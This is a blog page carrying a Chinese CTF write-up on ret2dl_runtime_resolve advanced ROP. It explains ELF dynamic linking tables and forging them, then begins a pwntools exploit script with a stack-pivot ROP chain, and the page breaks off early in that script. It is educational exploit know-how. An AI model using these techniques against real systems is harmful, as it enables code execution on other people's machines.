<!DOCTYPE html>





<html lang="">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.9.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">

<link rel="stylesheet" href="/css/main.css?v=7.4.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.4.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="Resit much,Obey little">
<meta property="og:type" content="website">
<meta property="og:title" content="ZERO-A-ONE">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="ZERO-A-ONE">
<meta property="og:description" content="Resit much,Obey little">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZERO-A-ONE">
<meta name="twitter:description" content="Resit much,Obey little">
  <link rel="canonical" href="http://yoursite.com/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>ZERO-A-ONE</title>
  








  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">
  <div class="container use-motion">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ZERO-A-ONE</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
      
      
      
        
        <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
      
      
      
        
        <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a href="javascript:;" class="popup-trigger">
        
          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
      </li>
    
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="Searching..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            
  <div id="posts" class="posts-expand">
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/14/╕▀╝╢ROP-ret2dl-runtime╓«═¿╔▒╧Ω╜Γ/" class="post-title-link" itemprop="url">高级ROP-ret2dl_runtime之通杀详解</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-14 09:17:05" itemprop="dateCreated datePublished" datetime="2019-09-14T09:17:05-07:00">2019-09-14</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-15 00:17:32" itemprop="dateModified" datetime="2019-09-15T00:17:32-07:00">2019-09-15</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>前言：花了好几天研究这几个类型题，发觉了个通用规律，原来越高级的题目利用起来越容易，因为根本不用画太多时间改exp，直接改几个变量就可以直接打成功。。。所以想写篇文章记录下，以前怕高级rop，理解原理并利用后发觉简单了</p>
<h2 id="ret2dllruntime-原理"><a href="#ret2dllruntime-原理" class="headerlink" title="ret2dllruntime 原理"></a>ret2dllruntime 原理</h2><p>先推荐几个地址学习下</p>
<ul>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop" target="_blank" rel="noopener">ctf-wiki之高级ROP</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure/" target="_blank" rel="noopener">ctf-wiki之elf文件基本结构</a></li>
</ul>
<p>虽然以上不是我的博客，不过这些个大佬帮助了我，给个链接也是应该的。<br>ctf-wiki那个题目我感觉不够经典，还多了个write函数，单一难以泄露才是最经典的题目，所以我选了这个题目来做示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的栈溢出<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172828-f84086dc-7305-1.png" alt="img"></a><br>可没有多余的函数可以泄露，这对于我这千年通过leak进行rop的玩家很不友好，因为这道题我做过，虽然当时没做出也没研究，不过以前欠过的债迟早要还的，在国赛就在遇到了它，国赛的时候我找到了别人的exp，0ctf-2018的题目一把梭了。在赛后好好研究了一下这个题目，发觉这类题型就是改改exp就可以通杀，发觉很舒服做这种题。好了，话不多说，开始正文：<br>没有leak，如何做呢，ctf-wiki高级ROP了解一波</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>要想弄懂这个 ROP 利用技巧，需要首先理解 ELF 文件的基本结构，以及动态链接的基本过程，请参考 executable 中 elf 对应的介绍。这里我只给出相应的利用方式。</p>
<p>我们知道在 linux 中是利用_dl_runtime_resolve(link_map_obj, reloc_index) 来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。具体利用方式如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">控制程序执行 dl_resolve 函数</span><br><span class="line">    给定 Link_map 以及 index 两个参数。</span><br><span class="line">    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。</span><br><span class="line">控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</span><br><span class="line">伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</span><br><span class="line">伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</span><br></pre></td></tr></table></figure>

<p>此外，这个攻击成功的很必要的条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</span><br><span class="line">dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">    r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure>

<p><strong>相信各位看官在看到这里的时候跟我一样懵，因为我也不了解具体原理当时，看着这段话不知道什么意思，所以我就先去了解elf的基本结构以及动态链接的基本过程（PS:我也没完整看完，枯燥乏味，通过调试一点点理解过程的)</strong><br>这里先说下动态延迟绑定机制：<br>就是一开始把所有的函数都链接实际是一种浪费，因此采用延迟绑定技术,核心是第一次用的时候进行绑定，没有用到不进行绑定，这样用来加快程序的运行速度<br>所以第一次调用的这个函数的时候，程序会去查表，然后利用_dl_runtime_resolve将正确的地址写入got.plt表里，下次查询的时候就直接跳到正确的地址处<br>先看下调试部分吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">► 0x8048390  &lt;read@plt&gt;                  jmp    dword ptr [read@got.plt] &lt;0x804a00c&gt;</span><br><span class="line"></span><br><span class="line">   0x8048396  &lt;read@plt+6&gt;                push   0</span><br><span class="line">   0x804839b  &lt;read@plt+11&gt;               jmp    0x8048380</span><br><span class="line">    ↓</span><br><span class="line">   0x8048380                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048386                              jmp    dword ptr [0x804a008] &lt;0xf7fe96c0&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fe96c0 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fe96c1 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fe96c2 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fe96c3 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fe96c7 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fe96cb &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe3ac0&gt;</span><br></pre></td></tr></table></figure>

<p>这是我在read@plt处下断，</p>
<ul>
<li>你看他第一次调用的时候，<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>里存的是下一条指令的地址，也就是0x8048396，</li>
<li>然后将read函数在表里的偏移push进去，这里push的是0，</li>
<li>然后跳到plt0里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a>表里，然后将程序的控制权交给解析出来的地址指向的函数</li>
</ul>
<p><strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong><br>这只是通俗易懂的说法，实际伪造这个表起来不是那么简单，除非你理解了整个过程<br>我将ctf-wiki上的内容摘抄过来了，帮助你们理解，他是进行了完整的解释，我感觉太长了，不过我理解过后看的话，看懂了。。。</p>
<h2 id="elf部分的关键点（来自ctf-wiki"><a href="#elf部分的关键点（来自ctf-wiki" class="headerlink" title="elf部分的关键点（来自ctf-wiki)"></a>elf部分的关键点（来自ctf-wiki)</h2><p>动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。</p>
<ol>
<li>当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。</li>
<li>如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。</li>
<li>这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。</li>
<li>那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。</li>
<li>因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。</li>
<li>在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。</li>
<li>当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。</li>
<li>过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。</li>
</ol>
<p>在 Linux 的设计中，第一个之后的 PLT 条目进行了如下的函数调用</p>
<p>_dl_runtime_resolve(link_map_obj, reloc_index)</p>
<p>这里以 32 位为例（64 位类似），具体的过程如下</p>
<ul>
<li>根据 reloc_index 计算相应的重定位表项：Elf32_Rel *reloc = JMPREL + index</li>
<li>根据得到的重定位表项的 r_info 得到对应的符号在符号表中的索引：(reloc-&gt;r_info)&gt;&gt;8</li>
<li>继而得到对应的符号：Elf32_Sym *sym = &amp;SYMTAB[((reloc-&gt;r_info)&gt;&gt;8)]</li>
<li>判断符号的类型是否为 R_386_JMP_SLOT：assert (((reloc-&gt;r_info)&amp;0xff) == 0x7 )</li>
<li>if ((ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)<ul>
<li>if (sym-&gt;st_other) &amp; 3 == 0 )</li>
<li>判断该符号是否已经解析过了，如果解析过，就不会再去执行 lookup 操作。</li>
</ul>
</li>
<li>得到符号的版本，如果 ndx 为 0 的话，会直接使用 local symbol。</li>
<li><ul>
<li>uint16_t ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8]</li>
</ul>
</li>
<li><ul>
<li>r_found_version *version = &amp;l-&gt;l_version[ndx]</li>
</ul>
</li>
<li>根据 name 来寻找相应函数在库中的地址。<ul>
<li>name = STRTAB + sym-&gt;st_name</li>
</ul>
</li>
</ul>
<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>刚刚我说了攻击方式，接下来我们就要伪造偏移跟表了<br>简单来说，ret2dllruntime这个攻击方式他要利用三个表:</p>
<ol>
<li>.rel.plt</li>
<li>.dynsym</li>
<li>.dynstr</li>
<li>他先从.rel.plt表里找到某个函数在dynsym里的偏移</li>
<li>然后从.dynsym符号表里找寻该函数在.dynstr表里的偏移</li>
<li>在从.dynstr表里找到具体的函数对应的字符串，然后将这个字符串解析成函数<br>所以如果我们可以找到这个表，改掉这个表里的字符串，按理说也是可以进行调用成功的<br>贴张图，这是整体结构部分图</li>
</ol>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172844-014afe92-7306-1.png" alt="img"></a></p>
<h3 id="第一个表是-rel-plt也就是ELF-REL-Relocation-Table"><a href="#第一个表是-rel-plt也就是ELF-REL-Relocation-Table" class="headerlink" title="第一个表是.rel.plt也就是ELF REL Relocation Table"></a>第一个表是.rel.plt也就是ELF REL Relocation Table</h3><p>这个表里有个结构体，存储了写入位置和具体偏移量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804831C ; ELF REL Relocation Table</span><br><span class="line">LOAD:0804831C                 Elf32_Rel &lt;8049FFCh, 306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048324                 Elf32_Rel &lt;804A040h, 705h&gt; ; R_386_COPY stderr</span><br><span class="line">LOAD:0804832C                 Elf32_Rel &lt;804A060h, 905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048334                 Elf32_Rel &lt;804A064h, 605h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:0804833C ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0804833C                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048344                 Elf32_Rel &lt;804A010h, 207h&gt; ; R_386_JMP_SLOT alarm</span><br><span class="line">LOAD:0804834C                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048354                 Elf32_Rel &lt;804A018h, 507h&gt; ; R_386_JMP_SLOT setvbuf</span><br><span class="line">LOAD:08048354 LOAD            ends</span><br></pre></td></tr></table></figure>

<ul>
<li>前面是写入的位置，而107代表的是偏移为1的导入函数，07代表的是导入函数的意思，所以你在exp里会看到&lt;&lt;8位或者&gt;&gt;8位这种操作，就是去掉07或者增加07</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">           Elf32_Addr r_offset;</span><br><span class="line">           Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure>

<ul>
<li>他实际是个结构体，每个都由r_offset和r_info组成，r_info存的也是偏移，是在dynsym表里的偏移,例如read，他在这里是107h就是偏移为1的导入函数，从ELF Symbol Table里找</li>
</ul>
<h3 id="第二个表是-dynsym也就是ELF-Symbol-Table"><a href="#第二个表是-dynsym也就是ELF-Symbol-Table" class="headerlink" title="第二个表是.dynsym也就是ELF Symbol Table"></a>第二个表是.dynsym也就是ELF Symbol Table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481DC ; ELF Symbol Table</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aRead - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aAlarm - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;alarm&quot;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aGmonStart - offset byte_804827C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804827C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804821C                            0&gt;</span><br><span class="line">LOAD:0804822C                 Elf32_Sym &lt;offset aSetvbuf - offset byte_804827C, 0, 0, 12h, 0, 0&gt; ; &quot;setvbuf&quot;</span><br><span class="line">LOAD:0804823C                 Elf32_Sym &lt;offset aStdout - offset byte_804827C, \ ; &quot;stdout&quot;</span><br><span class="line">LOAD:0804823C                            offset stdout@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804824C                 Elf32_Sym &lt;offset aStderr - offset byte_804827C, \ ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804824C                            offset stderr@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br><span class="line">LOAD:0804825C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804827C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804825C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804826C                 Elf32_Sym &lt;offset aStdin - offset byte_804827C, \ ; &quot;stdin&quot;</span><br><span class="line">LOAD:0804826C                            offset stdin@@GLIBC_2_0, 4, 11h, 0, 1Ah&gt;</span><br></pre></td></tr></table></figure>

<p>在这个表里查到也就是第一个函数，没毛病，其实这个表每个项也是一个结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure>

<p>我们所以要伪造的还有st_name，让他去我们的.dynstr表里查找，查找到我们需要的</p>
<h3 id="第三个表就是-dynstr了，也就是ELF-String-Table"><a href="#第三个表就是-dynstr了，也就是ELF-String-Table" class="headerlink" title="第三个表就是.dynstr了，也就是ELF String Table"></a>第三个表就是.dynstr了，也就是ELF String Table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804827C ; ELF String Table</span><br><span class="line">LOAD:0804827C byte_804827C    db 0                    ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804827C                                         ; LOAD:080481FC↑o ...</span><br><span class="line">LOAD:0804827D aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">LOAD:08048287 aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048296 aStdin          db &apos;stdin&apos;,0            ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:0804829C aRead           db &apos;read&apos;,0             ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:080482A1 aStdout         db &apos;stdout&apos;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482A8 aStderr         db &apos;stderr&apos;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:080482AF aAlarm          db &apos;alarm&apos;,0            ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:080482B5 aSetvbuf        db &apos;setvbuf&apos;,0          ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:080482BD aLibcStartMain  db &apos;__libc_start_main&apos;,0</span><br><span class="line">LOAD:080482BD                                         ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CF aGmonStart      db &apos;__gmon_start__&apos;,0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:080482DE aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">LOAD:080482E8                 dd 20000h, 2, 2 dup(20002h), 20001h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:0804830C                 dd 0D696910h, 20000h, 62h, 0</span><br></pre></td></tr></table></figure>

<p>这个没啥好解释的就是一串字符串，找到这个后，_dl_lookup就会拿这个字符串去查找对应的函数，然后将函数地址取回来写入got.plt表，最后将程序控制权交给该函数<br><strong>注意：这里的都是相对偏移地址，没有绝对地址，切记切记，不然等会构造exp的时候你会一脸懵逼的</strong></p>
<h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>我将exp分段进行讲述吧，从exp里调试或许能更清晰的解释这个过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">offset = 44</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">io = process(&apos;./pwn&apos;)</span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(&apos;a&apos;*offset)</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br></pre></td></tr></table></figure>

<p>这段只是进行栈的迁移，这个部分的知识自行到ctf-wiki补充，或者找些题目练下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br></pre></td></tr></table></figure>

